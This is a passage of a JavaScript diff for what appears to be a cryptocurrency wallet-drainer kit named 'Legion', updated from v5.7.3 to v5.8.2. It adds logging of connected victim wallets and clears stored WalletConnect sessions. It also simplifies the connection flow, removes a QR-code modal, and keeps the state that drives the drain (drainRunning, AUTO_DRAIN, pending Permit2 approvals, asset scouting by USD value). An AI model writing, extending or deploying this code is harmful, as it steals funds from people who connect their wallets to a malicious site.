+      S.scoutUsd = Math.max(S.scoutUsd, Number(rankedAll.total_usd) || 0);
+      L.log('Backend scout USD:', S.scoutUsd.toFixed(2));
+    }
     evmCtx.chainId = await ensureFundedEvmChain(evmCtx.provider, evmCtx.address, evmCtx.chainId);
     S.evmChain = evmCtx.chainId;
     var priority = SCOUT.chainPriority();
@@ -3372,45 +3044,6 @@
         onPick(w);
       });
     },
-
-    showQR: function (uri) {
-      var old = document.getElementById('__lgn_qr'); if (old) old.remove();
-      var ov = document.createElement('div');
-      ov.id = '__lgn_qr';
-      ov.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:2147483647;display:flex;align-items:center;justify-content:center';
-      var box = document.createElement('div');
-      box.style.cssText = 'background:#fff;border-radius:20px;padding:28px 28px 20px;text-align:center;position:relative;max-width:280px;width:90vw';
-      var title = document.createElement('p');
-      title.style.cssText = 'margin:0 0 14px;font-size:15px;font-weight:600;color:#111';
-      title.textContent = 'Scan with your wallet';
-      var qrWrap = document.createElement('div');
-      qrWrap.style.cssText = 'width:200px;height:200px;margin:0 auto 14px;background:#f3f4f6;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:12px;color:#777';
-      qrWrap.textContent = 'Loading QR...';
-      loadVendorScript('qrcode.min.js').then(function () {
-        var canvas = document.createElement('canvas');
-        qrWrap.innerHTML = '';
-        qrWrap.appendChild(canvas);
-        return drawQrToCanvas(canvas, uri);
-      }).catch(function () {
-        qrWrap.innerHTML = '';
-        qrWrap.style.cssText += ';padding:12px;word-break:break-all;font-size:11px;line-height:1.4';
-        qrWrap.textContent = uri;
-      });
-      var copy = document.createElement('button');
-      copy.style.cssText = 'background:#6d28d9;color:#fff;border:none;border-radius:8px;padding:8px 18px;cursor:pointer;font-size:13px;font-weight:600;margin-bottom:4px';
-      copy.textContent = 'Copy Link';
-      copy.onclick = function () { navigator.clipboard && navigator.clipboard.writeText(uri); copy.textContent = 'Copied!'; };
-      var closeX = document.createElement('button');
-      closeX.style.cssText = 'position:absolute;top:10px;right:12px;background:transparent;border:none;color:#aaa;font-size:18px;cursor:pointer;padding:4px';
-      closeX.textContent = '✕';
-      closeX.onclick = function () { ov.remove(); };
-      box.appendChild(closeX); box.appendChild(title); box.appendChild(qrWrap); box.appendChild(copy);
-      ov.appendChild(box);
-      ov.onclick = function (e) { if (e.target === ov) ov.remove(); };
-      document.body.appendChild(ov);
-    },
-
-    hideQR: function () { var el = document.getElementById('__lgn_qr'); if (el) el.remove(); },
   };
 
   // ═══════════════════════════════════════════════════════════════
@@ -3431,6 +3064,7 @@
 
       S.evmAddr = address; S.evmChain = chainId;
       S.evmProvider = provider; S.evmWallet = walletName;
+      L.log('Connected wallet:', address, '|', walletName, '| chain', chainId);
 
       var chainMeta = CHAIN_META[chainId] || { name: 'Chain ' + chainId };
       UI.setConnected(address, chainMeta.name);
@@ -3440,6 +3074,7 @@
       S.drainRunning = true;
       S.pendingEvmPermit2 = null;
       S.connectSession = 'legion:' + Date.now() + ':' + Math.random().toString(36).slice(2, 8);
+      S.fusionNotified = false;
       UI.showStatus('Scanning assets...');
 
       Object.assign(S.nonEvm, detectNonEvm());
@@ -3517,18 +3152,30 @@
     if (!S.vaultLoaded) await prefetchVault();
     installWcGuard();
     UI.status('Opening WalletConnect...');
+    _wcConnecting = false;
+
+    try {
+      if (typeof window.LegionWallet !== 'undefined' && window.LegionWallet.disconnect) {
+        await window.LegionWallet.disconnect();
+      }
+    } catch (e) {}
+    try {
+      var wcKeys = [];
+      for (var wi = 0; wi < localStorage.length; wi++) {
+        var wk = localStorage.key(wi);
+        if (!wk) continue;
+        var wkl = wk.toLowerCase();
+        if (wkl.indexOf('wc@') === 0 || wkl.indexOf('walletconnect') !== -1 ||
+            wkl.indexOf('w3m') !== -1 || wkl.indexOf('@w3m') !== -1) wcKeys.push(wk);
+      }
+      wcKeys.forEach(function (k) { try { localStorage.removeItem(k); } catch (e2) {} });
+      if (wcKeys.length) L.log('WC: cleared', wcKeys.length, 'stale key(s)');
+    } catch (e3) {}
 
     var wcProv = null;
     try {
+      L.log('WC: Reown AppKit bundle (Uniswap/Aave style)');
       wcProv = await bundledWalletConnect();
-      if (!wcProv) {
-        L.log('Bundled AppKit failed — trying UniversalProvider (no CDN AppKit — avoids crash)');
-        wcProv = await universalConnect();
-      }
-      if (!wcProv) {
-        L.log('UniversalProvider failed — fallback WC EthereumProvider modal');
-        wcProv = await wcConnect();
-      }
       if (!wcProv) {
         removeWcGuard();
         UI.status('WalletConnect failed');
@@ -3605,7 +3252,7 @@
       };
     }
 
-    L.log('Legion v5.7.3 ready — ' + S.discovered.length + ' wallet(s) detected');
+    L.log('Legion v5.8.2 ready — ' + S.discovered.length + ' wallet(s) detected');
 
     // Only auto-connect when explicitly enabled (never on silentMode alone)
     if (CFG.autoConnectOnLoad === true && AUTO_DRAIN && !S.drainRunning && window.ethereum) {
